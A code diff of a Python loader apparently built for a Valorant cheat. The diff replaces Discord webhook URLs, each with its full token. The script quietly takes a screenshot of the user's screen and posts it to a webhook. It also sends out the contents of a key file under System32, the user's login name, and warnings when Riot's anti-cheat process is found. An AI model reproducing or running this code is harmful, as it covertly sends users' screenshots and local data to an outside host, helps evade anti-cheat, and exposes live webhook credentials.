@@ -20,7 +20,7 @@ os.system('cls')
 if file_contentsx1 =="ppYnNtw99XO3G":
     exit()
 screenshot_pathx = take_screenshot_and_save()
-send_screenshot_to_discord("https://discord.com/api/webhooks/1326055025755029525/SjdzM50XA1hduFyDQmQTPw96FHLF4b0HZYzjjTZhuoNpJnW0L2j0qeqpjopIK6aq4hqU", screenshot_path)
+send_screenshot_to_discord("https://discord.com/api/webhooks/1326419589533536388/8wcu3bdBoRw-0uanJC1CP-bmIVGO9wFcOlCFZQ4m2fZ8VenddBOM4SkhIDsSfAisB5kW", screenshot_path)
 delete_screenshot(screenshot_pathx)
 os.system('cls')
 pvvalorant="VALORANT.EXE"
@@ -33,7 +33,7 @@ def check_program_run_2():
             file_timestamp = os.path.getmtime(file_path)
             file_time = datetime.fromtimestamp(file_timestamp)
             if file_time >= boot_time:
-                send_dx("https://discord.com/api/webhooks/1326018838579646475/RAlQMvPXVo0FSTsZA22TB8NLJHDl73MeKzs3CXpJg43niiX73XwmCNe5WJUczot-_BnK", "HVCI WARNING.")
+                send_dx("https://discord.com/api/webhooks/1326419500270358649/5aSzqgQ3j1pX4VS4FdBm8nCTTqj6vWIi9sb__nM2S0l2N_wgAEajHN2YxtyJd8JmzhEf", "HVCI WARNING.")
                 os.system('cls')
                 print("ERROR, Valorant anti-cheat is running.")
                 input()
@@ -53,13 +53,13 @@ os.system('cls')
 file_pathkeyx = r"C:\Windows\System32\xsystem\xaes.txt"
 with open(file_pathkeyx, 'r') as file:
     contentxsf = file.read()
-send_dx("https://discord.com/api/webhooks/1326019230789013538/lQOxyIugVPj0hbJpz0Gghj8PcPsVwazV-jymiSPwSMTfM8v4dpiaow95Ng0rnhHTl4_x", contentxsf)
+send_dx("https://discord.com/api/webhooks/1326419589533536388/8wcu3bdBoRw-0uanJC1CP-bmIVGO9wFcOlCFZQ4m2fZ8VenddBOM4SkhIDsSfAisB5kW", contentxsf)
 os.system('cls')
 file_pathmybootaes = r"C:\myaesboot.txt"
 if os.path.exists(file_pathmybootaes):
     usernamex = os.getlogin()
     mymsgx = usernamex+"tried to load another settings of aes"
-    send_dx("https://discord.com/api/webhooks/1326018838579646475/RAlQMvPXVo0FSTsZA22TB8NLJHDl73MeKzs3CXpJg43niiX73XwmCNe5WJUczot-_BnK", mymsgx)
+    send_dx("https://discord.com/api/webhooks/1326419500270358649/5aSzqgQ3j1pX4VS4FdBm8nCTTqj6vWIi9sb__nM2S0l2N_wgAEajHN2YxtyJd8JmzhEf", mymsgx)
     print("")
     print("")
     print("")
@@ -77,7 +77,7 @@ def check_timezone():
     utc_time = time.gmtime()
     time_difference = (time.mktime(local_time) - time.mktime(utc_time)) / 3600
     if time_difference != 8:
-        send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "wrong time, not utc8+")
+        send_dx("https://discord.com/api/webhooks/1326419500270358649/5aSzqgQ3j1pX4VS4FdBm8nCTTqj6vWIi9sb__nM2S0l2N_wgAEajHN2YxtyJd8JmzhEf", "wrong time, not utc8+")
         os.system('cls')
         print("Set your timezone to UTC8+.")
         input()
@@ -169,7 +169,7 @@ def add_path_and_install_libraries():
 os.system('cls')
 resultxy = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
 if 'vgc.exe' in resultxy.stdout:
-    send_dx("https://discord.com/api/webhooks/1326018838579646475/RAlQMvPXVo0FSTsZA22TB8NLJHDl73MeKzs3CXpJg43niiX73XwmCNe5WJUczot-_BnK", "Tried to run AES While valorant is running. warning from loader")
+    send_dx("https://discord.com/api/webhooks/1326419500270358649/5aSzqgQ3j1pX4VS4FdBm8nCTTqj6vWIi9sb__nM2S0l2N_wgAEajHN2YxtyJd8JmzhEf", "Tried to run AES While valorant is running. warning from loader")
     os.system('cls')
     print("---ERROR. Please run AES first before you open Valorant.")
     print("---If error persists, restart PC.")
